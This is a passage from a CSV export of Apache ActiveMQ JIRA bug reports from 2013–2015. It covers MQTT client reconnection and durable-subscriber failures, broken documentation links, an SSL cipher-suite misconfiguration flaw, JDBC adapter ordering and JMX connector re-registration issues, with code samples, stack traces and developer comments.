No message is shown in the server. The problem doesn't occur always but most of the times the first reconnection attempt is made. With setCleanSession(true) the system works fine.
Code sample (publisher, permanently running):
{code}
MQTT mqtt = new MQTT();
mqtt.setHost(url);
mqtt.setUserName(user);
mqtt.setPassword(password);
mqtt.setClientId(""test_id"");

int i = 0;
while (true) {
	BlockingConnection connection = mqtt.blockingConnection();
	connection.connect();
	String message = ""TestMessage: "" + i;
	connection.publish(""TopicA"", message.getBytes(), QoS.AT_LEAST_ONCE, false);
	System.out.println(""Vendor: Sent message."");

	Thread.sleep(2500);
	connection.disconnect();
	Thread.sleep(2500);
	i++;
}
{code}
Code sample (subscriber, fails multiple times when restarting after the connection is closed):
{code}
BlockingConnection connection = null;
try {
    MQTT = new MQTT();
    mqtt.setHost(url);
    mqtt.setClientId(clientId);
    mqtt.setUserName(user);
    mqtt.setPassword(password);
    mqtt.setCleanSession(false);

    connection = mqtt.blockingConnection();
    connection.connect();
    Topic[] topics = {new Topic(""TopicA"", QoS.EXACTLY_ONCE)};
    byte[] qoses = connection.subscribe(topics);
    int numMessages = 1;
    while (numMessages % 10 != 0) {
        Message message = connection.receive();
        byte[] payload = message.getPayload();
        String messageContent = new String(payload);
        System.out.println(""Received message from topic: "" + message.getTopic() + "" Message content: "" + messageContent);
        message.ack();
        numMessages++;
    }
} finally {
    if(connection != null) {
        try {
            connection.disconnect();
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
}
{code}
The test failed when using the current fusesource client (1.5) on ActiveMQ 5.9, on Mosquitto mqtt the code works correctly",,davydewaele,pmarques,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Jun/13 17:58;pmarques;MQTTTest.java;https://issues.apache.org/jira/secure/attachment/12588422/MQTTTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,333563,,,Tue Oct 14 17:15:42 UTC 2014,,,,,,,,,,,"0|i1ljif:",333891,,,,,,,,,,,,,,,,,,,,,"17/Jun/13 18:26;tabish;Not fully following the code to reproduce, best bet is to create a unit test similar to those in the activemq-mqtt module so we can run it and see the issue and ensure that the fix is preserved into the future. ;;;","17/Jun/13 18:50;pmarques;Yes, well the code is not simple because I used two classes running simultaneously... The publisher always sending messages, the subscriber receiving 10 messages on each ""run"". The problem occurs when restarting the subscriber after the first run (leaving some time between runs in order to allow the publisher to publish some messages). Theoretically it would be simple to use only one class publish some messages, receive them on the subscriber, close the subscriber, publish more messages, and attempt to reconnect and receive those messages but I haven't tested this method. I should stress that the problem, although it fails frequently, doesn't occur every time, I had multiple ""runs"" of the subscriber that processed the pending messages correctly.;;;","17/Jun/13 19:00;tabish;The test code is easy to work from so I'd try and create a unit test, I won't have time to do that before I leave for vacation but if you can create a test case the fix could be simple and I might get it in quickly. ;;;","18/Jun/13 17:37;tabish;Was able to recreate the issue in a test, added test to trunk.  ;;;","18/Jun/13 17:58;pmarques;Tentative test code disconnecting several times.;;;","18/Jun/13 17:58;pmarques;I was actually trying to replicate the problem on a test but I was having some problems making the test fail consistently... I attached the code I was trying (testReceivePendingMessages), even with high values on ""numberOfRuns"" and ""messagesPerRun"" the system only fails some times. I also had problems with the tests never stopping... I don't know if it's because I am using windows or if it's something on my test code but the tests easily ended up not stopping, especially when I changed the setCleanSession to true.;;;","19/Jun/13 11:13;pmarques;Forget about the locking problem when setCleanSession(true)... It was just a distraction on my part, obviously, if I clean the session there are no messages pending and the receive blocks...;;;","19/Jun/13 20:53;tabish;The problem is a tricky one, it looks like there might be an issue in the MQTT client.  The issue happens on subscribe when for some reason the client receives two SUBACK frames when there appears to only have been one sent.  You can see it in this trace log where the SUBSCRIBE followed by a PUBLISH results in two SUBACK frames and the second one causes the client to bail.  

{noformat}
2013-06-19 16:50:40,556 | DEBUG | MQTTProtocolConverter          | MQTT Client MQTT-Sub-Client connected.
2013-06-19 16:50:40,557 | INFO  | MQTTTest                       | Client Received:
MQTTFrame { type: CONNACK, qos: AT_MOST_ONCE, dup:false }
2013-06-19 16:50:40,557 | INFO  | MQTTTest                       | MQTT login accepted
2013-06-19 16:50:40,557 | INFO  | MQTTTest                       | Client Sent:
MQTTFrame { type: SUBSCRIBE, qos: AT_LEAST_ONCE, dup:false }
2013-06-19 16:50:40,559 | TRACE | MQTTIO                         | Received: 
MQTTFrame { type: SUBSCRIBE, qos: AT_LEAST_ONCE, dup:false }
2013-06-19 16:50:40,562 | TRACE | MQTTIO                         | Sending: 
MQTTFrame { type: SUBACK, qos: AT_MOST_ONCE, dup:false }
2013-06-19 16:50:40,562 | TRACE | MQTTIO                         | Sending: 
MQTTFrame { type: PUBLISH, qos: AT_LEAST_ONCE, dup:false }
2013-06-19 16:50:40,562 | INFO  | MQTTTest                       | Client Received:
MQTTFrame { type: SUBACK, qos: AT_MOST_ONCE, dup:false }
2013-06-19 16:50:40,562 | INFO  | MQTTTest                       | Client Received:
MQTTFrame { type: SUBACK, qos: AT_MOST_ONCE, dup:false }
2013-06-19 16:50:40,562 | INFO  | MQTTTest                       | Fatal connection failure: %s
java.net.ProtocolException: Command from server contained an invalid message id: 1
	at org.fusesource.mqtt.client.CallbackConnection.completeRequest(CallbackConnection.java:723)
	at org.fusesource.mqtt.client.CallbackConnection.processFrame(CallbackConnection.java:762)
	at org.fusesource.mqtt.client.CallbackConnection.access$1500(CallbackConnection.java:51)
	at org.fusesource.mqtt.client.CallbackConnection$6.onTransportCommand(CallbackConnection.java:392)
	at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:659)
	at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:538)
	at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:209)
	at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:100)
	at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)
2013-06-19 16:50:40,563 | INFO  | MQTTTest                       | Client Received:
MQTTFrame { type: PUBLISH, qos: AT_LEAST_ONCE, dup:false }
2013-06-19 16:50:40,564 | INFO  | BrokerService                  | Apache ActiveMQ 5.9-SNAPSHOT (localhost, ID:OfficePC-37216-1371675037999-0:1) is shutting down
{noformat}
;;;","24/Jun/14 16:29;tabish;This appears to have been fixed in the MQTT hardening that went into the 5.10.0 release.  If any new issues like this emerge please create a new issue to track with tests. ;;;","14/Oct/14 06:22;davydewaele;[~tabish121] Can you confirm that work was done on AcitveMQ for this ? I also feel like this is an issue on the MQTT Client (FuseSource) 

We're seeing the exact same issue on our stack:

- Apache Active MQ 5.10.0
- Camel 2.14
- MQTT Client 1.10.0 (FuseSource)

There appears to be a github issue for it as well : https://github.com/fusesource/mqtt-client/issues/26;;;","14/Oct/14 10:10;tabish;There are fixes to both the client and the MQTT support on the broker.  You should run with the latest release of both.;;;","14/Oct/14 17:05;davydewaele;I think there is still an issue with the FuseSource client (Even the latest version). It's easy to reproduce the timing issue. See the Github issue for more details. The issue in the latest FuseSource client is that a PUBACK can be processed before the PUB was completed.

When the client sends a PUB over the wire it can happen that it immediately starts processing the PUBACK before it finished its internal bookkeeping on the PUB. (FuseSource thinks the PUBACK is an invalid message id because it hasn't fully registered the PUB yet).;;;","14/Oct/14 17:15;tabish;You'll need to try and raise the priority of that with the Fuse client project.  I beleive the broker side troubles have been resolved in this area.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Links on http://activemq.apache.org/redelivery-policy.html are outdated,AMQ-4583,12653163,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,lichtin,lichtin,17/Jun/13 09:58,17/Jun/13 14:24,14/Jul/23 05:43,17/Jun/13 14:24,,,,,,,,,Documentation,,,,0,,,,,,,,,"The links to the code are no longer working.
For example:

http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/RedeliveryPolicy.java?view=markup

Similar problem with code links on page http://activemq.apache.org/message-redelivery-and-dlq-handling.html

Perhaps further pages are affected?",,lichtin,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,333486,,,Mon Jun 17 14:24:54 UTC 2013,,,,,,,,,,,"0|i1lj1b:",333814,,,,,,,,,,,,,,,,,,,,,"17/Jun/13 14:24;tabish;Fixed on ones I could find, open more as you encounter other broken links.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Specifying invalid ciphersuite in SSL transport causes all available ciphersuites to be enabled,AMQ-4582,12652700,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,rhuffman,rhuffman,13/Jun/13 17:02,08/Aug/13 20:27,14/Jul/23 05:43,08/Aug/13 20:27,5.8.0,,,,,5.9.0,,,Broker,,,,1,security,ssl,,,,,,,"If you use an invalid cipher suite in the parameter ""transport.enabledCipherSuites"" on an SSL transport connector, the broker will start with all ciphers enabled.

For example, use this transport connector:

    <transportConnectors>
      <transportConnector name=""ssl"" uri=""ssl://localhost:61717?needClientAuth=true&amp;transport.enabledCipherSuites=foobar""/>
    </transportConnectors>


This is an attempt to enable the ciphersuite ""foobar"". The broker starts, and, in my environment I end up with 26 cipher suites enabled, 10 of which are generally considered weak.

Using the debugger I tracked this down to the method org.apache.activemq.util.IntrospectionSupport.setProperty. It uses reflection to invoke SSLServerSocket.setEnabledCipherSuites. That method throws an IllegalArgumentException if the specified ciphersuite is enabled. IntrospectionSupport.setProperty catches the exception and returns false.

I believe that this code should not be ignoring exceptions like this. This is a major security flaw: if a user is attempting to lock down ActiveMQ to a specific strong cipher suite, but makes a typo, the broker starts with with the ability to use weaker cipher suites.",Linux 3.2.0-41-generic x86_64,kearls,qerub,rhuffman,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4433,,,,,,,,,,,,,"16/Jul/13 16:21;kearls;AMQ-4582.patch;https://issues.apache.org/jira/secure/attachment/12592567/AMQ-4582.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,333024,,,Thu Aug 08 20:27:47 UTC 2013,,,,,,,,,,,"0|i1lg6n:",333352,,,,,,,,,,,,,,,,,,,,,"13/Jun/13 17:58;tabish;AMQ-4428 adds logging of the error so your broker will indicate that a problem was detected in you configuration file.  ;;;","16/Jul/13 16:21;kearls;A patch with TcpTransportServer.configureServerSocket() updated to throw an Exception if IntrospectionSupport.setProperties returns false.  Previously this value was ignored.

Also included a simple unit test.

;;;","16/Jul/13 18:42;tabish;Might need to dig in deeper here since this breaks many unit tests in activemq-unit-tests;;;","22/Jul/13 14:03;tabish;@Kevin you might look at the patches attached to AMQ-4433 issue in conjunction with your work on this issue. ;;;","23/Jul/13 15:30;kearls;The patch for TcpTransportServer.java in AMQ-4433 looks good, however this time I'll run the whole test suite to be sure.;;;","24/Jul/13 06:52;kearls;Actually that patch ended up causing a few other test failures.  I'll take a look at them later today.
;;;","24/Jul/13 09:49;qerub;Reporter of AMQ-4433 here. Yeah, I removed the changes to TcpTransportServer.java from my latest patch (see the comments of AMQ-4433) because of the test failures. IIRC, the problem is that other non-transport parameters enter that code path and mess things up. I gave up on validating the transport parameters because it seemed like too much work for me, sorry. I hope you know the codebase better and can sort things out!;;;","08/Aug/13 20:27;tabish;I've patched the problem in the code for now by treating this option as a special case just to ensure we don't start up with all suites enabled as that's just not good.  We should still look to improve this so that bad options are detected and cause things to not start.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JDBCPersistenceAdapter can ignore statements settings depending on configuration order.,AMQ-4581,12652408,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,12/Jun/13 14:01,24/Jul/13 16:20,14/Jul/23 05:43,12/Jun/13 14:19,5.8.0,,,,,5.9.0,,,Message Store,,,,0,,,,,,,,,"When a jdbcPersistenceAdapter is configured using the ""adapter"" attribute (as below), the tablePrefix specified in the statements element is ignored during table creation.

{code}
<jdbcPersistenceAdapter createTablesOnStartup=""true"" dataSource=""#mysql-ds"" adapter=""#sybase-adapter""  useDatabaseLock=""true"">
  <statements>
    <statements tablePrefix=""myprefix_""/>
  </statements>
</jdbcPersistenceAdapter>

  .....
<bean id=""sybase-adapter"" class=""org.apache.activemq.store.jdbc.adapter.SybaseJDBCAdapter""/>

{code}

It seems spring is calling the org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.setAdapter() method before org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.setStatements() is called. The setAdapter() triggers the table creation - hence no *tablePrefix"" is used.

This problems can be worked around if the adapter is configured as an element (as below) however this isn't the most ideal fix.

{code}
<persistenceAdapter>
  <jdbcPersistenceAdapter>
    <statements>
      <statements tablePrefix=""myprefix_""/>
    </statements>
    <adapter>
      <sybase-jdbc-adapter/>
    </adapter>
  </jdbcPersistenceAdapter>
</persistenceAdapter>
{code}
",,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4382,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,332732,,,Wed Jun 12 14:19:04 UTC 2013,,,,,,,,,,,"0|i1ledz:",333061,,,,,,,,,,,,,,,,,,,,,"12/Jun/13 14:19;tabish;fixed on trunk ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MQTT BlockingConnection.receive fails when subscribing multiple topics,AMQ-4576,12651340,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,pmarques,pmarques,06/Jun/13 14:26,17/Jun/13 17:54,14/Jul/23 05:43,12/Jun/13 22:10,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"When more than one topic is supplied to BlockingConnection.subscribe the BlockingConnection.receive fails and the following exception is thrown:
{code}
java.io.IOException: Could not connect: CONNECTION_REFUSED_SERVER_UNAVAILABLE
	at org.fusesource.mqtt.client.CallbackConnection$LoginHandler$1.onTransportCommand(CallbackConnection.java:331)
	at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:659)
	at org.fusesource.hawtdispatch.transport.SslTransport.drainInbound(SslTransport.java:264)
	at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:538)
	at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:209)
	at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:100)
	at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)
{code}
On the server shows the following messages:
{code}
2013-06-06 15:06:00,125 WARN  [org.apache.activemq.transport.mqtt.MQTTProtocolConverter] (ActiveMQ BrokerService[localhost] Task-1) Exception occurred processing: 
null: javax.jms.JMSException: Durable consumer is in use for client: 6056@3232261834SOC and subscriptionName: 6056@3232261834SOC
2013-06-06 15:06:00,130 WARN  [org.apache.activemq.broker.TransportConnection] (ActiveMQ Transport: tcp:///127.0.0.1:53389@1883) Failed to add Connection ID:LTD-SFW004-53303-1370527418664-2:14, reason: javax.jms.InvalidClientIDException: Broker: localhost - Client: 6056@3232261834SOC already connected from tcp://127.0.0.1:53388
2013-06-06 15:06:00,130 WARN  [org.apache.activemq.broker.TransportConnection.Transport] (ActiveMQ Transport: tcp:///127.0.0.1:53389@1883) Transport Connection to: tcp://127.0.0.1:53389 failed: java.io.IOException: Broker: localhost - Client: 6056@3232261834SOC already connected from tcp://127.0.0.1:53388
2013-06-06 15:06:00,130 ERROR [pt.intellicare.onecare.mqtt.OneCareFuseMqttClient] (DefaultQuartzScheduler_Worker-8) Problem receiving mqtt messages: java.io.IOException: Could not connect: CONNECTION_REFUSED_SERVER_UNAVAILABLE
	at org.fusesource.mqtt.client.CallbackConnection$LoginHandler$1.onTransportCommand(CallbackConnection.java:331) [:1.5-SNAPSHOT]
	at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:659) [:1.17]
	at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:538) [:1.17]
	at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:209) [:1.17]
	at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:100) [:1.17]
	at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77) [:1.17]
{code}
Code example:
{code}
MQTT = new MQTT();
mqtt.setHost(url);
mqtt.setClientId(clientId);
mqtt.setUserName(user);
mqtt.setPassword(password);
mqtt.setCleanSession(false);

BlockingConnection connection = mqtt.blockingConnection();
connection.connect();
Topic[] topics = {new Topic(""TopicA"", QoS.EXACTLY_ONCE), new Topic(""TopicB"", QoS.EXACTLY_ONCE)};
byte[] qoses = connection.subscribe(topics);
while (true) {
    Message message = connection.receive();
    byte[] payload = message.getPayload();
    String messageContent = new String(payload);
    System.out.println(""Received message from topic: "" + message.getTopic() + "" Message content: "" + messageContent);
    message.ack();
}
{code}
The test failed when using the current fusesource client (1.5) on ActiveMQ 5.9, on Mosquitto mqtt the code works correctly.
",,pmarques,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,331666,,,Mon Jun 17 17:54:27 UTC 2013,,,,,,,,,,,"0|i1l7un:",331997,,,,,,,,,,,,,,,,,,,,,"12/Jun/13 21:10;tabish;This will probably need a bit of thought.  The broker is doing what it was designed to do here, allowing only one durable subscriber with the same client Id and subscription name.  In the case of the MQTT code as it currently stands when the subscribe occurs the code uses the client Id as the subscription name as well. ;;;","12/Jun/13 22:10;tabish;Fixed on trunk. test added.;;;","17/Jun/13 17:54;pmarques;Tested the new version and it appears corrected.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JDBCIOExceptionHandler does not restart TransportConnector when JMX is enabled  on broker - java.io.IOException: Transport Connector could not be registered in JMX,AMQ-4575,12651332,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,pgfox,pgfox,06/Jun/13 13:38,19/Jun/15 19:14,14/Jul/23 05:43,06/Jun/13 16:33,5.8.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"
Without JMX enabled on the broker; when the DB is shutdown and subsequently restarted the JDBCIOExceptionHandler does a shutdown and restart on the transport connector as expected.

However when JMX is enabled on the broker the transport connector fails to restart throwing the following exception and subsequently shutting down the broker 

{code}

2013-06-06 15:25:22,113 [st IO exception] - INFO  DefaultIOExceptionHandler      - Stopping the broker due to exception, java.io.IOException: Transport Connector could not be registered in JMX: org.apache.activemq:type=Broker,brokerName=localhost,connector=clientConnectors,connectorName=tcp_//sideshow.home_61616
java.io.IOException: Transport Connector could not be registered in JMX: org.apache.activemq:type=Broker,brokerName=localhost,connector=clientConnectors,connectorName=tcp_//sideshow.home_61616
	at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:27)
	at org.apache.activemq.broker.BrokerService.registerConnectorMBean(BrokerService.java:1972)
	at org.apache.activemq.broker.BrokerService.startTransportConnector(BrokerService.java:2434)
	at org.apache.activemq.broker.BrokerService.startAllConnectors(BrokerService.java:2351)
	at org.apache.activemq.util.DefaultIOExceptionHandler$2.run(DefaultIOExceptionHandler.java:101)
Caused by: javax.management.InstanceAlreadyExistsException: org.apache.activemq:type=Broker,brokerName=localhost,connector=clientConnectors,connectorName=tcp_//sideshow.home_61616
	at com.sun.jmx.mbeanserver.Repository.addMBean(Repository.java:453)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.internal_addObject(DefaultMBeanServerInterceptor.java:1484)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerDynamicMBean(DefaultMBeanServerInterceptor.java:963)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerObject(DefaultMBeanServerInterceptor.java:917)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerMBean(DefaultMBeanServerInterceptor.java:312)
	at com.sun.jmx.mbeanserver.JmxMBeanServer.registerMBean(JmxMBeanServer.java:482)
	at org.apache.activemq.broker.jmx.ManagementContext.registerMBean(ManagementContext.java:380)
	at org.apache.activemq.broker.jmx.AnnotatedMBean.registerMBean(AnnotatedMBean.java:72)
	at org.apache.activemq.broker.BrokerService.registerConnectorMBean(BrokerService.java:1969)
	... 3 more

{code}","tested against latest apache trunk  (5.9 - snapshot)
svn 14900032",gilesdsilva,pgfox,tabish,volkerk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Apr/14 15:17;gilesdsilva;DuplicateTransportConnectorsInListTest.java;https://issues.apache.org/jira/secure/attachment/12642473/DuplicateTransportConnectorsInListTest.java","06/Jun/13 13:42;pgfox;JDBCIOExceptionHandlerTest.java;https://issues.apache.org/jira/secure/attachment/12586499/JDBCIOExceptionHandlerTest.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,331658,,,Fri Jun 19 19:14:57 UTC 2015,,,,,,,,,,,"0|i1l7sv:",331989,,,,,,,,,,,,,,,,,,,,,"06/Jun/13 13:42;pgfox;Attached a unit test for the issue- JDBCIOExceptionHandlerTest.java;;;","06/Jun/13 13:54;pgfox;It seems that org.apache.activemq.broker.BrokerService.stopAllConnectors(...) does not unregister the transport connectors MBean.;;;","06/Jun/13 16:33;tabish;fixed on trunk.;;;","28/Apr/14 15:48;gilesdsilva;The transport connectors are unregistered when stopping the broker service but the transport connector list is not cleared, so when we restart the broker (eg: Database failover) the transport connectors get duplicated and now we try to register them twice leading to a ""java.io.IOException: Transport Connector could not be registered in JMX: Failed to bind to server socket""

;;;","28/Apr/14 19:04;tabish;Can you create a JUnit test along the lines of the JDBCIOExceptionHandlerTest that was originally added to show the issue you are running into?;;;","28/Apr/14 22:37;gilesdsilva;Attached a unit test for the issue - Failed to bind to server socket;;;","29/Apr/14 14:15;tabish;The file you attached actually appears to be a copy of BrokerService.java.  ;;;","29/Apr/14 15:17;gilesdsilva;Oops! Re-attached the right one now;;;","19/Jun/15 19:14;volkerk;Ugh. ""The transport connectors are unregistered when stopping the broker service but the transport connector list is not cleared"". In other words they were NOT being unregistered.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
broken link at http://svn.apache.org/repos/asf/activemq/trunk/activemq-core/src/main/resources/META-INF/services/org/apache/activemq/store/jdbc/,AMQ-4572,12650916,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,,shikida,shikida,04/Jun/13 16:42,04/Jun/13 17:39,14/Jul/23 05:43,04/Jun/13 17:39,,,,,,,,,,,,,0,,,,,,,,,the link to the config file at http://svn.apache.org/repos/asf/activemq/trunk/activemq-core/src/main/resources/META-INF/services/org/apache/activemq/store/jdbc/ is broken from http://activemq.apache.org/jdbc-support.html,,shikida,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,331243,,,Tue Jun 04 17:39:06 UTC 2013,,,,,,,,,,,"0|i1l593:",331576,,,,,,,,,,,,,,,,,,,,,"04/Jun/13 17:39;tabish;fixed, should work after the next site refresh;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
org.apache.activemq.transport.amqp.AmqpTransformerTest#testRawTransformation hangs,AMQ-4568,12650837,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,04/Jun/13 07:52,12/Jun/13 19:21,14/Jul/23 05:43,12/Jun/13 19:21,,,,,,,,,Test Cases,,,,0,,,,,,,,,"This test is currently hanging.  I'll attach a stack trace and a test patch which includes a timeout.
",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Jun/13 07:54;kearls;AMQ-4568.patch;https://issues.apache.org/jira/secure/attachment/12586066/AMQ-4568.patch","04/Jun/13 07:55;kearls;testRawTransformation.txt;https://issues.apache.org/jira/secure/attachment/12586067/testRawTransformation.txt",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,331164,,,Wed Jun 12 19:21:11 UTC 2013,,,,,,,,,,,"0|i1l4rj:",331497,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"04/Jun/13 07:54;kearls;Updated test with timeout added to prevent hangs;;;","04/Jun/13 07:55;kearls;Stack trace on hung test;;;","04/Jun/13 15:22;tabish;Added the timeout patch to trunk. ;;;","06/Jun/13 07:59;kearls;This test fails because the message returned by the following lines in AmqpProtocolConverter.onMessage() has a null messageId.

    EncodedMessage em = new EncodedMessage(delivery.getMessageFormat(), buffer.data, buffer.offset, buffer.length);
    final ActiveMQMessage message = (ActiveMQMessage) getInboundTransformer().transform(em);




;;;","12/Jun/13 19:21;tabish;test is working now on trunk. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
